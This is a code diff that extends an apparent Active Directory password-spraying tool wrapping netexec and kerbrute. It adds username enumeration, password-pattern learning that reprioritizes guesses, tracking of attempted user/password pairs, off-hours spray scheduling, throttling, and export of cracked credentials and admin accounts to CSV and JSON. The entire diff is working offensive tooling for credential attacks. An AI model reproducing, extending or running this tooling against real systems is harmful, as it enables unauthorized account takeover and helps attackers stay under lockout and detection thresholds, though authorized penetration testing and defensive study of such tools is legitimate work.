@@ -72,6 +72,10 @@ class Config:
     dry_run: bool = False
     no_preflight: bool = False
     log_dir: str = "./spraygun-out"
+    filter_disabled: bool = False
+    export: str = "none"
+    schedule: str = ""
+    timeline: bool = False
     # Derived fields
     users: List[str] = field(default_factory=list)
     passwords: List[str] = field(default_factory=list)
@@ -184,6 +188,54 @@ KERBRUTE_AUTHFAIL_PATTERNS = [
 ]
 
 # =============================================================================
+# Password pattern classification (for pattern learning)
+# =============================================================================
+
+def classify_password_pattern(pw: str) -> str:
+    """
+    Classify a password into a pattern category for learning.
+    Returns the pattern name (first match wins).
+    """
+    # Extract organization tokens from domain for org-based patterns
+    # This is a simple heuristic; real implementation would use cfg.domain
+    org_keywords = ["corp", "company", "org", "admin", "team", "office"]
+
+    # welcome_year: Welcome2026!, Winter2025!
+    if re.match(r"^Welcome.*\d{4}", pw, re.IGNORECASE):
+        return "welcome_year"
+
+    # seasonal_year: Summer2026!, January2025!
+    seasonal = ["Summer", "Winter", "Spring", "Fall", "Autumn",
+                "January", "February", "March", "April", "May", "June",
+                "July", "August", "September", "October", "November", "December"]
+    if any(pw.startswith(month) for month in seasonal):
+        if re.search(r"\d{4}", pw):
+            return "seasonal_year"
+
+    # org_year: Contains org keyword + 4-digit year
+    if any(kw in pw.lower() for kw in org_keywords) and re.search(r"\d{4}", pw):
+        return "org_year"
+
+    # ilove_org: IloveCompany123!, ILovePassword2026!
+    if re.match(r"^(Ilove|ILove)", pw, re.IGNORECASE):
+        return "ilove_org"
+
+    # password_num: Password123!, P@ssw0rd2026!
+    if re.match(r"^(Password|P@ssw0rd).*\d", pw, re.IGNORECASE):
+        return "password_num"
+
+    # corporate: Welcome123!, Changeme!
+    if re.match(r"^(Welcome|Change|Changeme|Corporate|Company|Office)", pw, re.IGNORECASE):
+        return "corporate"
+
+    # year_only: 2026!, 2024
+    if re.match(r"^\d{4}!?$", pw):
+        return "year_only"
+
+    # Default
+    return "generic"
+
+# =============================================================================
 # RichUI: Live terminal panels
 # =============================================================================
 
@@ -198,13 +250,13 @@ class RichUI:
         self.current_phase = "idle"  # idle, spray, countdown, stopped
         self.phase_data: Dict[str, Any] = {}
 
-    def start_spray(self, engine: Engine, secret: str, round_num: int):
+    def start_spray(self, engine: Engine, secret: str, round_num: int, batch_info: str = ""):
         """Initialize the Live display for spray phase."""
         self.current_phase = "spray"
         self.phase_data = {
             "engine": str(engine),
             "secret": secret,
-            "secret_display": secret[:8] + "..." if len(secret) > 8 else secret,  # Show first 8 chars
+            "batch_info": batch_info,
             "round": round_num,
             "successes": [],
             "admin_users": [],  # Track admin/pwn3d users separately for highlighting
@@ -278,7 +330,8 @@ class RichUI:
     def _build_summary(self) -> Panel:
         """Build the summary panel."""
         engine = self.phase_data.get("engine", "N/A")
-        secret_display = self.phase_data.get("secret_display", "***")
+        secret = self.phase_data.get("secret", "***")
+        batch_info = self.phase_data.get("batch_info", "")
         successes = self.phase_data.get("successes", [])
         admin_users = self.phase_data.get("admin_users", [])
         lockouts = self.phase_data.get("lockouts", set())
@@ -290,16 +343,20 @@ class RichUI:
         grid.add_column()
         grid.add_column(justify="right")
 
-        grid.add_row("[cyan]Engine:", engine)
-        grid.add_row("[cyan]Current password:", f"[yellow]{secret_display}[/yellow]")
+        # Show batch info if available
+        if batch_info:
+            grid.add_row("[cyan]Batch:", batch_info)
 
-        # Show errors first with prominent styling
-        if errors:
-            grid.add_row("[red bold]ERRORS:", str(len(errors)))
-            for err in errors[-3:]:  # Show last 3 errors
-                # Truncate long error messages
-                err_short = err[:60] + "..." if len(err) > 60 else err
-                grid.add_row("", f"  [red]✗[white] {err_short}")
+        grid.add_row("[cyan]Engine:", engine)
+        grid.add_row("[cyan]Current password:", f"[yellow]{secret}[/yellow]")
+
+        # Show credentials found (green highlight)
+        grid.add_row("[green]Credentials found:", str(len(successes)))
+        if successes:
+            admin_set = {u for u, _ in admin_users}
+            regular_successes = [(u, s) for u, s in successes if u not in admin_set]
+            for user, _ in regular_successes[-5:]:  # Show last 5
+                grid.add_row("", f"  [green]✓[white] {user}")
 
         # Show admin users with prominent styling
         if admin_users:
@@ -307,13 +364,12 @@ class RichUI:
             for user, _ in admin_users[-5:]:  # Show last 5
                 grid.add_row("", f"  [red bold]★[white] {user} [red](ADMIN)[/red]")
 
-        grid.add_row("[green]Credentials found:", str(len(successes)))
-        if successes:
-            # Show regular successes (excluding admins shown above)
-            admin_set = {u for u, _ in admin_users}
-            regular_successes = [(u, s) for u, s in successes if u not in admin_set]
-            for user, _ in regular_successes[-5:]:  # Show last 5
-                grid.add_row("", f"  [green]✓[white] {user}")
+        # Show errors
+        if errors:
+            grid.add_row("[red bold]ERRORS:", str(len(errors)))
+            for err in errors[-3:]:  # Show last 3 errors
+                err_short = err[:60] + "..." if len(err) > 60 else err
+                grid.add_row("", f"  [red]✗[white] {err_short}")
 
         grid.add_row("[yellow]Lockouts:", str(len(lockouts)))
         if lockouts:
@@ -412,6 +468,30 @@ class State:
         self.locked_users: Set[str] = set()
         self.completed_rounds = 0
 
+        # Feature 1: Credential-reuse matrix (password -> set of users attempted)
+        self.attempted_matrix: Dict[str, Set[str]] = {}
+
+        # Feature 3: Pattern learning (pattern -> success count)
+        self.success_by_pattern: Dict[str, int] = {}
+
+        # Feature 5: Admin users tracking (for CSV export)
+        self.admin_users: Dict[str, str] = {}  # user -> password
+
+        # Feature 4: Spray statistics
+        self.start_time: str = datetime.datetime.now().isoformat()
+        self.total_attempts: int = 0
+        self.attempts_by_password: Dict[str, int] = {}
+
+        # Temp file counter for userlist filtering
+        self._tmp_userlist_idx: int = 0
+
+        # Feature D: Automatic throttling on response stress
+        self.conn_fail_history: List[int] = []
+        self.delay_multiplier: float = 1.0
+
+        # Feature E: Timeline visualization
+        self.timeline_events: List[Dict] = []
+
         if cfg.resume:
             self._load()
         else:
@@ -439,12 +519,29 @@ class State:
         self.locked_users = set(data.get("locked_users", []))
         self.completed_rounds = data.get("completed_rounds", 0)
 
+        # Load new fields
+        raw_matrix = data.get("attempted_matrix", {})
+        self.attempted_matrix = {k: set(v) for k, v in raw_matrix.items()}
+        self.success_by_pattern = data.get("success_by_pattern", {})
+        self.admin_users = data.get("admin_users", {})
+        self.start_time = data.get("start_time", datetime.datetime.now().isoformat())
+        self.total_attempts = data.get("total_attempts", 0)
+        self.attempts_by_password = data.get("attempts_by_password", {})
+
+        # Load Feature D fields
+        self.conn_fail_history = data.get("conn_fail_history", [])
+        self.delay_multiplier = data.get("delay_multiplier", 1.0)
+
+        # Load Feature E field
+        self.timeline_events = data.get("timeline_events", [])
+
         # Rebuild queue: all passwords minus used
         all_pw = [p.strip() for p in self.cfg.passwords if p.strip()]
         self.remaining_queue = [p for p in all_pw if p not in self.used_passwords]
 
         self._log_line(f"=== Resuming from saved state at {datetime.datetime.now().isoformat()} ===")
         self._log_line(f"Used passwords: {len(self.used_passwords)}, remaining: {len(self.remaining_queue)}")
+        self._log_line(f"Credential matrix loaded: {sum(len(v) for v in self.attempted_matrix.values())} pairs")
         self._log_line("")
 
     def save(self):
@@ -454,6 +551,18 @@ class State:
             "found_creds": self.found_creds,
             "locked_users": list(self.locked_users),
             "completed_rounds": self.completed_rounds,
+            # New fields for operator fundamentals
+            "attempted_matrix": {k: list(v) for k, v in self.attempted_matrix.items()},
+            "success_by_pattern": self.success_by_pattern,
+            "admin_users": self.admin_users,
+            "start_time": self.start_time,
+            "total_attempts": self.total_attempts,
+            "attempts_by_password": self.attempts_by_password,
+            # Feature D: Throttling
+            "conn_fail_history": self.conn_fail_history,
+            "delay_multiplier": self.delay_multiplier,
+            # Feature E: Timeline
+            "timeline_events": self.timeline_events,
         }
         self.state_file.write_text(json.dumps(data, indent=2))
 
@@ -468,11 +577,19 @@ class State:
         if self.used_passwords:
             self.used_file.write_text("\n".join(self.used_passwords) + "\n")
 
+        # Export results if requested
+        if self.cfg.export in ("json", "all"):
+            self.export_results("json")
+        if self.cfg.export in ("csv", "all"):
+            self.export_results("csv")
+
     def record_spray_start(self, engine: Engine, secret: str, round_idx: int):
         """Log spray start header."""
         ts = datetime.datetime.now().isoformat()
         masked = "***"
         self._log_line(f"=== {ts} SPRAY engine={engine} secret={masked} round={round_idx} ===")
+        # Feature E: Record timeline event
+        self.record_timeline_event("spray", f"{engine} with masked secret", round_idx=round_idx)
 
     def record_spray_end(self, successes: int, lockouts: int, conn_fails: int, aborted: bool, abort_reason: str = "", errors: int = 0):
         """Log spray end trailer."""
@@ -480,16 +597,30 @@ class State:
         self._log_line(f"=== {ts} END successes={successes} lockouts={lockouts} conn_fails={conn_fails} errors={errors} aborted={aborted} reason={abort_reason} ===")
         self._log_line("")
 
-    def add_cred(self, user: str, secret: str):
+    def add_cred(self, user: str, secret: str, is_admin: bool = False):
         """Record a found credential."""
         self.found_creds[user] = secret
+        if is_admin:
+            self.admin_users[user] = secret
+
+        # Track pattern learning
+        pattern = classify_password_pattern(secret)
+        self.success_by_pattern[pattern] = self.success_by_pattern.get(pattern, 0) + 1
+
+        # Feature E: Record timeline event before save
+        self.record_timeline_event("credential", f"{user} (pattern: {pattern})")
+
         ts = datetime.datetime.now().isoformat()
-        self._log_line(f"{ts} CREDENTIAL {user}:{secret}")
+        self._log_line(f"{ts} CREDENTIAL {user}:{secret} admin={is_admin} pattern={pattern}")
         self.save()
 
     def add_lockout(self, user: str):
         """Record a lockout."""
         self.locked_users.add(user)
+
+        # Feature E: Record timeline event before save
+        self.record_timeline_event("lockout", user)
+
         ts = datetime.datetime.now().isoformat()
         self._log_line(f"{ts} LOCKOUT {user}")
         self.save()
@@ -504,6 +635,322 @@ class State:
         """Append a line to the overall log."""
         with open(self.overall_log, "a") as f:
             f.write(line + "\n")
+
+    # =============================================================================
+    # Feature 1: Credential-reuse matrix methods
+    # =============================================================================
+
+    def mark_attempted(self, secret: str, user: str):
+        """Record that a (user, password) pair was attempted."""
+        if secret not in self.attempted_matrix:
+            self.attempted_matrix[secret] = set()
+        self.attempted_matrix[secret].add(user)
+
+        # Update stats
+        self.total_attempts += 1
+        self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + 1
+
+    def mark_attempted_batch(self, secret: str, users: List[str]):
+        """Mark all users in a list as attempted for this secret (for kerbrute)."""
+        if secret not in self.attempted_matrix:
+            self.attempted_matrix[secret] = set()
+        self.attempted_matrix[secret].update(users)
+
+        # Update stats
+        self.total_attempts += len(users)
+        self.attempts_by_password[secret] = self.attempts_by_password.get(secret, 0) + len(users)
+
+    def build_userlist_for(self, secret: str) -> Tuple[str, int]:
+        """
+        Build a filtered userlist for a specific password.
+        Returns (temp_file_path, count_of_users_not_yet_attempted).
+        """
+        attempted = self.attempted_matrix.get(secret, set())
+        remaining_users = [u for u in self.cfg.users if u not in attempted]
+
+        if not remaining_users:
+            return ("", 0)
+
+        # Write temp file
+        self._tmp_userlist_idx += 1
+        tmp_path = self.log_dir / f".tmp-users-{self._tmp_userlist_idx}.txt"
+        tmp_path.write_text("\n".join(remaining_users) + "\n")
+
+        return (str(tmp_path), len(remaining_users))
+
+    # =============================================================================
+    # Feature 3: Pattern learning methods
+    # =============================================================================
+
+    def reprioritize_queue(self) -> int:
+        """
+        Reorder remaining_queue by successful-pattern score (stable sort).
+        Returns number of passwords that got boosted (score > 0).
+        """
+        if not self.success_by_pattern:
+            return 0  # No successes yet, no re-prioritization
+
+        def score(pw):
+            return self.success_by_pattern.get(classify_password_pattern(pw), 0)
+
+        before = list(self.remaining_queue)
+
+        # Python sort is stable → equal-score passwords keep relative order
+        self.remaining_queue.sort(key=score, reverse=True)
+
+        boosted = sum(1 for pw in self.remaining_queue if score(pw) > 0)
+        return boosted if self.remaining_queue != before else 0
+
+    # =============================================================================
+    # Feature 4: Spray statistics
+    # =============================================================================
+
+    def render_stats(self, console: Console) -> Table:
+        """Render spray statistics as a rich Table."""
+        table = Table(title="Spray Statistics", box=box.SQUARE)
+        table.add_column("Metric", style="cyan")
+        table.add_column("Value", style="white")
+
+        # Calculate elapsed time
+        start_dt = datetime.datetime.fromisoformat(self.start_time)
+        elapsed = datetime.datetime.now() - start_dt
+        elapsed_str = str(elapsed).split(".")[0]  # Remove microseconds
+
+        # Success rate
+        success_rate = 0.0
+        if self.total_attempts > 0:
+            success_rate = (len(self.found_creds) / self.total_attempts) * 100
+
+        table.add_row("Started", self.start_time)
+        table.add_row("Elapsed time", elapsed_str)
+        table.add_row("Total attempts", str(self.total_attempts))
+        table.add_row("Credentials found", str(len(self.found_creds)))
+        table.add_row("Success rate", f"{success_rate:.2f}%")
+        table.add_row("Lockouts", str(len(self.locked_users)))
+        table.add_row("Rounds completed", str(self.completed_rounds))
+
+        # Top 5 attempts by password
+        if self.attempts_by_password:
+            top_attempts = sorted(self.attempts_by_password.items(), key=lambda x: x[1], reverse=True)[:5]
+            table.add_row("", "")
+            table.add_row("[bold]Top passwords by attempts[/bold]", "")
+            for pw, count in top_attempts:
+                pw_display = pw[:30] + "..." if len(pw) > 30 else pw
+                table.add_row(f"  {pw_display}", str(count))
+
+        # Success by pattern
+        if self.success_by_pattern:
+            table.add_row("", "")
+            table.add_row("[bold]Success by pattern[/bold]", "")
+            sorted_patterns = sorted(self.success_by_pattern.items(), key=lambda x: x[1], reverse=True)
+            for pattern, count in sorted_patterns:
+                table.add_row(f"  {pattern}", str(count))
+
+        # Credential reuse (Feature C)
+        reused = self.detect_cred_reuse()
+        if reused:
+            table.add_row("", "")
+            table.add_row("[bold]Credential reuse[/bold]", "")
+            for pw, users in reused[:5]:  # Top 5
+                pw_display = pw[:20] + "..." if len(pw) > 20 else pw
+                users_str = ", ".join(users[:5])
+                if len(users) > 5:
+                    users_str += f" (+{len(users) - 5} more)"
+                table.add_row(f"  {pw_display} ({len(users)} users)", users_str)
+
+        return table
+
+    def get_compact_stats(self) -> str:
+        """Return compact one-line stats string for round summary."""
+        success_rate = 0.0
+        if self.total_attempts > 0:
+            success_rate = (len(self.found_creds) / self.total_attempts) * 100
+
+        top_pattern = "N/A"
+        if self.success_by_pattern:
+            top_pattern = max(self.success_by_pattern.items(), key=lambda x: x[1])[0]
+
+        # Credential reuse count
+        reused_count = len(self.detect_cred_reuse())
+        reuse_str = f" | Reuse: {reused_count}" if reused_count > 0 else ""
+
+        return f"Attempts: {self.total_attempts} | Success: {len(self.found_creds)} ({success_rate:.1f}%) | Top pattern: {top_pattern}{reuse_str}"
+
+    # =============================================================================
+    # Feature 5: JSON/CSV export
+    # =============================================================================
+
+    def export_results(self, fmt: str):
+        """Export results to JSON or CSV."""
+        if fmt == "json":
+            self._export_json()
+        elif fmt == "csv":
+            self._export_csv()
+
+    def _export_json(self):
+        """Export results to results.json."""
+        results = {
+            "started": self.start_time,
+            "config": {
+                "domain": self.cfg.domain,
+                "dc_ip": self.cfg.dc_ip,
+                "tool": self.cfg.tool,
+                "protocol": self.cfg.protocol,
+                "pth": self.cfg.pth_mode,
+            },
+            "stats": {
+                "total_attempts": self.total_attempts,
+                "credentials_found": len(self.found_creds),
+                "lockouts": len(self.locked_users),
+                "rounds_completed": self.completed_rounds,
+                "success_by_pattern": self.success_by_pattern,
+            },
+            "found_creds": self.found_creds,
+            "cred_reuse": [{"password": pw, "users": users} for pw, users in self.detect_cred_reuse()],
+            "admin_users": self.admin_users,
+            "locked_users": list(self.locked_users),
+            "attempted_pairs": sum(len(v) for v in self.attempted_matrix.values()),
+        }
+
+        json_path = self.log_dir / "results.json"
+        json_path.write_text(json.dumps(results, indent=2))
+
+    def _export_csv(self):
+        """Export credentials to results.csv."""
+        lines = ["user,password,is_admin,source_round,captured_at"]
+
+        # We'll capture the round number when each credential was found
+        # For now, export all found credentials
+        for user, secret in self.found_creds.items():
+            is_admin = "Y" if user in self.admin_users else "N"
+            # We don't track the exact round for each cred in the current implementation
+            # This would require extending the state further
+            captured_at = datetime.datetime.now().isoformat()
+            lines.append(f"{user},{secret},{is_admin},,{captured_at}")
+
+        csv_path = self.log_dir / "results.csv"
+        csv_path.write_text("\n".join(lines) + "\n")
+
+    # =============================================================================
+    # Feature C: Credential-reuse detection across users
+    # =============================================================================
+
+    def detect_cred_reuse(self) -> List[Tuple[str, List[str]]]:
+        """
+        Detect passwords used by multiple users (credential sharing).
+        Returns list of (password, [users]) sorted by user count descending.
+        """
+        by_pw: Dict[str, List[str]] = {}
+        for user, secret in self.found_creds.items():
+            by_pw.setdefault(secret, []).append(user)
+
+        # Filter to passwords used by >1 user, sort by user count desc
+        reused = sorted(
+            [(pw, sorted(users)) for pw, users in by_pw.items() if len(users) > 1],
+            key=lambda x: len(x[1]),
+            reverse=True
+        )
+        return reused
+
+    # =============================================================================
+    # Feature D: Automatic throttling on response stress
+    # =============================================================================
+
+    def update_throttle(self, round_conn_fails: int) -> float:
+        """
+        Update throttle multiplier based on connection failures this round.
+        Returns current multiplier after adjustment.
+        """
+        self.conn_fail_history.append(round_conn_fails)
+
+        if round_conn_fails > 0:
+            # Back off - increase multiplier (cap at 3x)
+            self.delay_multiplier = min(self.delay_multiplier * 1.5, 3.0)
+        else:
+            # Recover - decrease multiplier toward 1.0
+            self.delay_multiplier = max(self.delay_multiplier - 0.25, 1.0)
+
+        return self.delay_multiplier
+
+    # =============================================================================
+    # Feature E: Timeline visualization
+    # =============================================================================
+
+    def record_timeline_event(self, event_type: str, detail: str = "", round_idx: Optional[int] = None):
+        """
+        Record a timeline event. Does NOT call save() (events flushed periodically).
+        """
+        self.timeline_events.append({
+            "ts": datetime.datetime.now().isoformat(),
+            "type": event_type,
+            "detail": detail,
+            "round": round_idx,
+        })
+
+    def render_timeline_html(self) -> str:
+        """Generate self-contained HTML timeline visualization."""
+        events = self.timeline_events
+
+        # Color scheme for event types
+        colors = {
+            "round_start": "#3498db",      # blue
+            "spray": "#9b59b6",            # purple
+            "credential": "#27ae60",       # green
+            "lockout": "#e67e22",          # orange
+            "reprioritize": "#f39c12",     # yellow
+            "throttle": "#e74c3c",         # red
+            "schedule_wait": "#1abc9c",    # teal
+            "round_end": "#95a5a6",        # gray
+            "complete": "#2ecc71",         # bright green
+        }
+
+        html_parts = ["<!DOCTYPE html><html><head>"]
+        html_parts.append("<meta charset='UTF-8'>")
+        html_parts.append("<title>Spraygun Timeline</title>")
+        html_parts.append("<style>")
+        html_parts.append("body { font-family: 'Segoe UI, Tahoma, sans-serif; margin: 0; padding: 20px; background: #1e1e1e; color: #d4d4d4; }")
+        html_parts.append(".container { max-width: 1200px; margin: 0 auto; }")
+        html_parts.append("h1 { color: #4ec9b0; border-bottom: 2px solid #4ec9b0; padding-bottom: 10px; }")
+        html_parts.append(".event { margin: 10px 0; padding: 12px; border-left: 4px solid #666; background: #2d2d2d; border-radius: 4px; }")
+        for etype, color in colors.items():
+            html_parts.append(f".event-{etype} {{ border-left-color: {color}; }}")
+        html_parts.append(".ts { color: #888; font-size: 0.85em; }")
+        html_parts.append(".type { font-weight: bold; text-transform: uppercase; font-size: 0.75em; padding: 2px 6px; border-radius: 3px; margin-right: 8px; }")
+        html_parts.append(".detail { color: #aaa; font-size: 0.9em; margin-left: 8px; }")
+        html_parts.append(".round-tag { background: #444; padding: 2px 6px; border-radius: 3px; font-size: 0.75em; margin-left: 8px; }")
+        html_parts.append(".summary { background: #252525; padding: 15px; border-radius: 5px; margin: 20px 0; }")
+        html_parts.append(".summary h2 { margin-top: 0; color: #4ec9b0; }")
+        html_parts.append("</style></head><body>")
+
+        html_parts.append("<div class='container'>")
+        html_parts.append("<h1>Spraygun Timeline</h1>")
+
+        # Summary section
+        html_parts.append("<div class='summary'>")
+        html_parts.append("<h2>Summary</h2>")
+        html_parts.append(f"<p>Started: {self.start_time}</p>")
+        html_parts.append(f"<p>Total events: {len(events)}</p>")
+        html_parts.append(f"<p>Credentials found: {len(self.found_creds)}</p>")
+        html_parts.append(f"<p>Lockouts: {len(self.locked_users)}</p>")
+        html_parts.append(f"<p>Rounds completed: {self.completed_rounds}</p>")
+        html_parts.append("</div>")
+
+        # Events list
+        html_parts.append("<h2>Event Timeline</h2>")
+        for ev in events:
+            etype = ev.get("type", "unknown")
+            color = colors.get(etype, "#666")
+            html_parts.append(f"<div class='event event-{etype}'>")
+            html_parts.append(f"<div class='ts'>{ev['ts']}</div>")
+            html_parts.append(f"<span class='type' style='background: {color}'>{etype}</span>")
+            if ev.get("round"):
+                html_parts.append(f"<span class='round-tag'>Round {ev['round']}</span>")
+            if ev.get("detail"):
+                html_parts.append(f"<span class='detail'>{ev['detail']}</span>")
+            html_parts.append("</div>")
+
+        html_parts.append("</div></body></html>")
+        return "\n".join(html_parts)
 
 # =============================================================================
 # Engine invocation and classification
@@ -548,6 +995,10 @@ def classify_line(engine: Engine, line: str) -> Tuple[LineType, Optional[str]]:
         # Auth failure
         for pat in NXC_AUTHFAIL_PATTERNS:
             if re.search(pat, line, re.IGNORECASE):
+                # Try to extract username for cred-reuse tracking
+                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+)", line)
+                if m:
+                    return (LineType.AUTHFAIL, m.group(2))  # Return username
                 return (LineType.AUTHFAIL, None)
 
     elif engine.tool == "kerbrute":
@@ -587,12 +1038,59 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
     Run one engine invocation for one password/hash. Stream stdout line-by-line,
     classify, update UI/state, and return RoundResult.
     Aborts early if conn_fails >= cfg.conn_fail_limit.
+
+    Feature 1 (credential-reuse matrix): Uses a filtered userlist per password.
+    """
+    result = RoundResult()
+
+    # Build filtered userlist for this password (skip already-attempted users)
+    userlist_path, user_count = state.build_userlist_for(secret)
+
+    if user_count == 0:
+        # All users already attempted for this password
+        ui.console.print(f"[*] All {len(cfg.users)} users already attempted for this password; skipping", style="dim")
+        result.clean_finish = True
+        return result
+
+    ui.console.print(f"[*] Spraying {user_count} users (skipping {len(cfg.users) - user_count} already attempted)", style="dim")
+
+    # Store original cfg.userfile and restore after
+    original_userfile = cfg.userfile
+    cfg.userfile = userlist_path
+
+    try:
+        result = _spray_one_password_impl(engine, cfg, secret, ui, state, userlist_path)
+
+        # Feature 1: For kerbrute, mark all users as attempted on clean finish
+        # (kerbrute doesn't emit per-user lines for failures)
+        if result.clean_finish and engine.tool == "kerbrute":
+            remaining_users = [u for u in cfg.users if u not in state.attempted_matrix.get(secret, set())]
+            state.mark_attempted_batch(secret, remaining_users)
+
+    finally:
+        # Restore original userfile
+        cfg.userfile = original_userfile
+
+    return result
+
+
+def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, userlist_path: str) -> RoundResult:
+    """
+    Internal implementation of spray_one_password after userlist filtering.
+    Aborts early if conn_fails >= cfg.conn_fail_limit.
     """
     result = RoundResult()
 
     if cfg.dry_run:
         # Simulate tool output for --dry-run mode
         ui.feed_line(f"[DRY-RUN] Simulating {engine} with secret=***")
+
+        # For cred-reuse tracking, mark all users in the filtered list as attempted
+        with open(userlist_path, "r") as f:
+            dry_run_users = [line.strip() for line in f if line.strip()]
+
+        for user in dry_run_users:
+            state.mark_attempted(secret, user)
 
         # Simulate some fake lines based on round
         for i in range(5):
@@ -639,7 +1137,7 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
             result.abort_reason = "invalid-protocol"
             return result
 
-        cmd.extend(["-u", cfg.userfile, "-H" if cfg.pth_mode else "-p", secret])
+        cmd.extend(["-u", userlist_path, "-H" if cfg.pth_mode else "-p", secret])
         cmd.append("--continue-on-success")
 
     elif engine.tool == "kerbrute":
@@ -656,7 +1154,7 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
             result.abort_reason = "binary-not-found"
             return result
 
-        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", cfg.domain, cfg.userfile, secret]
+        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", cfg.domain, userlist_path, secret]
 
     else:
         ui.console.print(f"[!] Unknown engine tool: {engine.tool}", style="red")
@@ -696,7 +1194,8 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
                 user, secret_hit = data.split(":", 1)
                 result.successes.append((user, secret_hit))
                 ui.update_success(user, secret_hit)
-                state.add_cred(user, secret_hit)
+                state.add_cred(user, secret_hit, is_admin=False)
+                state.mark_attempted(secret, user)  # Feature 1: Track attempted pair
 
             elif line_type == LineType.ADMIN and data:
                 user, secret_hit = data.split(":", 1)
@@ -704,13 +1203,16 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
                 # Also add to successes since it's a valid credential
                 result.successes.append((user, secret_hit))
                 ui.update_admin(user, secret_hit)
-                state.add_cred(user, secret_hit)
+                state.add_cred(user, secret_hit, is_admin=True)
+                state.mark_attempted(secret, user)  # Feature 1: Track attempted pair
 
             elif line_type == LineType.LOCKOUT:
                 user_lock = data if data else "(unknown)"
                 result.lockouts.add(user_lock)
                 ui.update_lockout(user_lock)
                 state.add_lockout(user_lock)
+                if user_lock != "(unknown)":
+                    state.mark_attempted(secret, user_lock)  # Feature 1: Track attempted pair
 
             elif line_type == LineType.ERROR:
                 # Tool-level error (wrong realm, domain mismatch, etc.)
@@ -729,6 +1231,11 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
                     result.aborted = True
                     result.abort_reason = "tool-error"
                     break
+
+            elif line_type == LineType.AUTHFAIL:
+                # Track attempted user for cred-reuse matrix (Feature 1)
+                if data:
+                    state.mark_attempted(secret, data)
 
             elif line_type == LineType.CONN_ERROR:
                 result.conn_fails += 1
@@ -844,6 +1351,202 @@ def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
     # Fallback for kerbrute-only: we already checked port 88, consider that enough
     ui.console.print("  [+] Preflight complete (reachability verified)", style="green")
     return True, "Preflight passed"
+
+# =============================================================================
+# Feature 2: Filter disabled/non-existent accounts
+# =============================================================================
+
+def enumerate_valid_users(cfg: Config, ui: RichUI, console: Console) -> List[str]:
+    """
+    Run kerbrute userenum to filter out non-existent accounts.
+    Returns list of valid users (falls back to full list on error).
+    """
+    if not cfg.kerbrute_binary:
+        console.print("[!] kerbrute binary not found; skipping user filtering", style="yellow")
+        return cfg.users
+
+    console.print("[*] Enumerating valid users with kerbrute userenum...", style="cyan")
+
+    cmd = [cfg.kerbrute_binary, "userenum", "--dc", cfg.dc_ip, "-d", cfg.domain, cfg.userfile]
+
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+        )
+
+        valid_users = set()
+        for line in proc.stdout:
+            line = line.rstrip()
+            if not line:
+                continue
+
+            # kerbrute userenum format: [+] VALID USERNAME: user@domain
+            if "[+] VALID USERNAME:" in line:
+                m = re.search(r"[+] VALID USERNAME:\s+(\S+)", line)
+                if m:
+                    username_full = m.group(1)
+                    # Extract username before @
+                    username = username_full.split("@")[0]
+                    valid_users.add(username)
+
+        return_code = proc.wait(timeout=10)
+
+        if return_code == 0 and valid_users:
+            console.print(f"    [+] Found {len(valid_users)} valid users", style="green")
+            return sorted(valid_users)
+        else:
+            console.print("    [-] kerbrute userenum failed or returned no results", style="yellow")
+            console.print("    [*] Falling back to full user list", style="dim")
+            return cfg.users
+
+    except Exception as e:
+        console.print(f"    [-] Error running kerbrute userenum: {e}", style="yellow")
+        console.print("    [*] Falling back to full user list", style="dim")
+        return cfg.users
+
+# =============================================================================
+# Feature B: Spray window scheduling
+# =============================================================================
+
+class SprayWindow:
+    """Spray time window: business-hours, off-hours, or custom range."""
+
+    def __init__(self, spec: str):
+        """Parse preset or 'HH:MM-HH:MM' range."""
+        self.spec = spec.lower()
+        self.start_minute = None  # minutes since midnight
+        self.end_minute = None
+        self.days = set()  # 0=Mon,...,6=Sun; empty=all days
+
+        if self.spec == "business-hours":
+            # Mon-Fri 09:00-17:00
+            self.start_minute = 9 * 60
+            self.end_minute = 17 * 60
+            self.days = {0, 1, 2, 3, 4}  # Mon-Fri
+        elif self.spec == "off-hours":
+            # Mon-Fri 17:00-09:00 (overnight) + all weekend
+            self.start_minute = 17 * 60
+            self.end_minute = 9 * 60
+            self.days = {0, 1, 2, 3, 4}  # Active Mon-Fri (wraparound overnight)
+            # Weekend handling in is_in_window (all Sat/Sun are in window)
+        else:
+            # Custom "HH:MM-HH:MM" or "H-H"
+            self._parse_range()
+
+    def _parse_range(self):
+        """Parse custom range like '09:00-17:00' or '9-17'."""
+        try:
+            parts = self.spec.split("-")
+            if len(parts) != 2:
+                raise ValueError("Invalid range format")
+
+            def parse_minutes(t):
+                if ":" in t:
+                    h, m = t.split(":")
+                    return int(h) * 60 + int(m)
+                else:
+                    return int(t) * 60
+
+            self.start_minute = parse_minutes(parts[0])
+            self.end_minute = parse_minutes(parts[1])
+        except Exception:
+            # Default to unrestricted if parse fails
+            self.start_minute = 0
+            self.end_minute = 24 * 60
+
+    def is_in_window(self, now: Optional[datetime.datetime] = None) -> bool:
+        """Check if current time is within the spray window."""
+        if now is None:
+            now = datetime.datetime.now()
+
+        weekday = now.weekday()  # 0=Mon,...,6=Sun
+        minute = now.hour * 60 + now.minute
+
+        # off-hours special case: all weekend is in window
+        if self.spec == "off-hours":
+            if weekday in {5, 6}:  # Sat/Sun
+                return True
+            # Weekday: in window if 17:00-09:00 (overnight wrap)
+            if minute >= self.start_minute or minute < self.end_minute:
+                return True
+            return False
+
+        # Check day restriction
+        if self.days and weekday not in self.days:
+            return False
+
+        # Normal range check
+        if self.start_minute <= self.end_minute:
+            # Non-wrapping: 09:00-17:00
+            return self.start_minute <= minute < self.end_minute
+        else:
+            # Wrapping: 22:00-06:00
+            return minute >= self.start_minute or minute < self.end_minute
+
